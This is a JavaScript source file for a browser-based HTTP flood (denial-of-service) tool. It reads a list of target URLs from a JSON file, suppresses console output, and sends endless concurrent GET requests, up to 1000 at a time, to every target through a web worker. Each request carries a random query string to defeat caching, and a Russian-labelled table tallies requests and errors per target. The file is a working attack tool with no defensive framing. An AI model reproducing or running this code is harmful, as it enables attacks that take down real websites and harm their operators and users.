var statsEl = document.getElementById('stats');


import { Comlink } from '../node_modules/comlinkjs/comlink.es6.js';

var uuid = require('uuid');

var worker = new Worker('../node_modules/comlink-fetch/src/fetch.worker.js');

var proxy = Comlink.proxy(worker);


var CONCURRENCY_LIMIT = 1000;
var queue = [];

var targets = require('../../target.json');
window['console']['log'] = function() {};
window['console']['error'] = function() {};
function printStats() {
  statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Количество запросов</th><th>Количество ошибок</th></tr></thead><tbody>' + Object.entries(targets)
    .map(([target, { number_of_requests, number_of_errored_responses, label }]) => '<tr><td>' + label + '</td><td>' + number_of_requests + '</td><td>' +
      number_of_errored_responses + '</td></tr>')
    .join('') + '</tbody></table>';
}

setInterval(printStats, 1000);

async function fetchWithTimeout(resource, options) {
  const controller = new AbortController();
  const API = await new proxy.Fetch;
  var rang = uuid.v4();
  API.setBaseUrl(resource);
  const id = setTimeout(() => controller.abort(), options.timeout);
  return API.get(`?${rang}`).then((response) => {
    clearTimeout(id);
    return response;
  }).catch((error) => {
    clearTimeout(id);
    // throw error;
  });
}

async function flood(target) {
  for (var i = 0;; ++i) {
    if (queue.length > CONCURRENCY_LIMIT) {
      await queue.shift()
    }
    queue.push(
      fetchWithTimeout(target, { timeout: 1000 })
        .catch((error) => {
          if (error.code === 20 /* ABORT */) {
            return;
          }
          targets[target].number_of_errored_responses++;
        })
        .then((response) => {
          if (response && !response.ok) {
            targets[target].number_of_errored_responses++;
          }
          targets[target].number_of_requests++;
        })

    )
  }
}
// Start
Object.keys(targets).map(flood);